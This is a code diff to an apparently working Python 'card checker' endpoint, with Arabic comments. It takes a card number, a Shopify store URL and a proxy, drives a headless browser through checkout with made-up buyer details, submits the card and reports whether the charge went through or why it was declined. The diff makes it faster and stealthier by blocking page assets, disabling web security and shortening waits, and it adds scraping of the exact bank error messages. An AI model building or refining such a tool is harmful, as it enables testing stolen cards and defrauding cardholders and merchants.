@@ -30,7 +30,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         if len(yy) == 2: yy = "20" + yy
 
         store_url = url.rstrip('/')
-        
         proxy_url = format_proxy(proxy)
         req_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
 
@@ -41,10 +40,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         address = f"{random.randint(100, 9999)} Broadway"
         full_name = f"{fn} {ln}"
 
-        # 1. سحب كود المنتج السريع
         variant_id, price = None, "-"
         try:
-            r = requests.get(f"{store_url}/products.json?limit=250", timeout=15, proxies=req_proxies)
+            r = requests.get(f"{store_url}/products.json?limit=250", timeout=10, proxies=req_proxies)
             if r.status_code == 200:
                 products = r.json().get('products', [])
                 for p in products:
@@ -60,7 +58,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         if not variant_id:
             return JSONResponse(content=safe_response("Product Not Found", "-"))
 
-        # 2. تشغيل المتصفح المخفي
         with sync_playwright() as p:
             proxy_settings = None
             if proxy_url:
@@ -76,10 +73,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "--disable-infobars",
                 "--no-sandbox",
                 "--disable-setuid-sandbox",
-                "--disable-dev-shm-usage" # مهم جداً لمنع كراش السيرفر المجاني
+                "--disable-dev-shm-usage",
+                "--disable-web-security"
             ]
 
-            # فتح المتصفح مخفي (Headless = True) عشان يشتغل على السيرفر
             browser = p.chromium.launch(headless=True, args=browser_args, proxy=proxy_settings)
             
             context = browser.new_context(
@@ -90,14 +87,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             
             page = context.new_page()
 
-            try:
-                # 3. الإضافة للسلة والدفع
-                page.goto(f"{store_url}/cart/add?id={variant_id}&quantity=1", timeout=60000)
-                time.sleep(1.5)
-                page.goto(f"{store_url}/checkout", timeout=60000)
-                time.sleep(3) 
+            # 🔥 التحديث الجبار: منع تحميل الصور والـ CSS لتسريع المتصفح 4 أضعاف
+            page.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "stylesheet", "font", "media"] else route.continue_())
 
-                # 4. ملء البيانات
+            try:
+                # قللنا أوقات الانتظار لأن الصفحة هتحمل أسرع بكتير
+                page.goto(f"{store_url}/cart/add?id={variant_id}&quantity=1", timeout=45000)
+                page.goto(f"{store_url}/checkout", timeout=45000, wait_until="domcontentloaded")
+                time.sleep(2) 
+
                 page.locator('input[name="email"], input#checkout_email').first.fill(email)
                 page.locator('input[name="firstName"], input[name="shippingAddress.firstName"]').first.fill(fn)
                 page.locator('input[name="lastName"], input[name="shippingAddress.lastName"]').first.fill(ln)
@@ -109,16 +107,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 
                 page.locator('input[name="postalCode"], input[name="shippingAddress.zip"]').first.fill("10024")
                 page.locator('input[name="phone"], input[name="shippingAddress.phone"]').first.fill(phone)
-                time.sleep(1)
+                time.sleep(0.5)
 
                 try:
                     btn = page.locator('button:has-text("Continue to payment"), button#continue_button')
                     if btn.is_visible():
                         btn.click()
-                        time.sleep(3)
+                        time.sleep(2)
                 except: pass
 
-                # 5. تعبئة الكارت
                 frame_num = page.frame_locator('iframe[name^="card-fields-number"]')
                 frame_num.locator('input[name="number"], input[id="number"]').first.fill(cc_num)
                 
@@ -134,21 +131,32 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         frame_name.locator('input[name="name"], input[id="name"]').first.fill(full_name)
                 except: pass
 
-                # 6. الضغط على دفع
                 page.locator('button:has-text("Pay now"), button#continue_button, button[id="checkout-pay-button"]').click()
                 
-                # 7. انتظار الرد
-                time.sleep(12)
+                # انتظار الرد
+                time.sleep(10)
+                
+                # 🔥 التحديث الجبار 2: صائد الأخطاء الذكي
+                error_locator = page.locator('.notice__text, .field__message, .payment-due__price, p.notice__text, div.notice--error')
+                
                 page_text = page.content().lower()
                 
-                if "insufficient funds" in page_text or "declined" in page_text or "security code was incorrect" in page_text or "issue processing your payment" in page_text:
-                    return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", price))
-                elif "thank you" in page_text or "order confirmed" in page_text:
+                if "thank you" in page_text or "order confirmed" in page_text:
                     return JSONResponse(content=safe_response("Order completed 💎", price))
                 elif "submitfailed" in page_text or "couldn't be processed" in page_text:
                      return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", price))
+                
+                # سحب رسالة الخطأ الحقيقية اللي ظهرت على الشاشة
+                if error_locator.first.is_visible():
+                    exact_error = error_locator.first.inner_text().strip()
+                    if exact_error:
+                        return JSONResponse(content=safe_response(f"Declined: {exact_error} 💳", price))
+
+                # لو مفيش خطأ واضح في كلاس معين، هندور بالطريقة العادية
+                if "insufficient funds" in page_text or "declined" in page_text or "security code was incorrect" in page_text or "issue processing your payment" in page_text:
+                    return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", price))
                 else:
-                    return JSONResponse(content=safe_response("Declined: Payment Error / Unrecognized", price))
+                    return JSONResponse(content=safe_response("Declined: Bank Rejected / Error Not Found", price))
                     
             except Exception as e:
                 return JSONResponse(content=safe_response(f"Browser Flow Error: {str(e)[:50]}", price))
